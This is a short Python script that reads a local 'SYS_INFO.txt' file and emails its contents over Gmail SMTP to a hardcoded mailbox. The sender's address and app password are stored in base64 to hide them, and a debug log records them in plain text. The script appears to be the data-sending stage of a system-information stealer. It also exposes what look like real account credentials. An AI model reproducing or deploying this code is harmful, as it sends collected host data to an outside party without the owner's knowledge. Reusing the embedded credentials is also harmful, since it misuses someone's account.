import smtplib
import codecs
import logging
from email.message import EmailMessage

logging.basicConfig(filename="winfo.log", filemode="a", level=logging.ERROR)

USER = b"bG9nYW5rZGV2ZW1haWxAZ21haWwuY29t"
PASS = b"Z2h3aSB1bHhuIHB6YnIgem56dw=="
SYS_INFO = "SYS_INFO.txt"
decUser = codecs.decode(USER, "base64")
decPass = codecs.decode(PASS, "base64")
username = bytes.decode(decUser, encoding='utf-8', errors='strict')
password = bytes.decode(decPass, encoding='utf-8', errors='strict')
    
email = EmailMessage()
email["from"] = "SYS_INFO"
email["to"] = username
email["subject"] = "SYSINFO"


def cast_file_to_message(file):
    """Read SYS_INFO.txt and cast it as a string into the body of an email."""
    logging.debug("Casting file to message...")
    with open(file, "r") as f:
        message = f.read()
        logging.debug("File cast to message.")
        return message


def send_mail():
    """Send email."""
    logging.debug(f'{username}')
    logging.debug(f'{password}')
    with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.login(username, password)
        smtp.send_message(email)
        logging.debug("Message sent!")
        print("Message sent successfully!")


if __name__ == "__main__":
    email.set_content(cast_file_to_message(SYS_INFO))
    send_mail()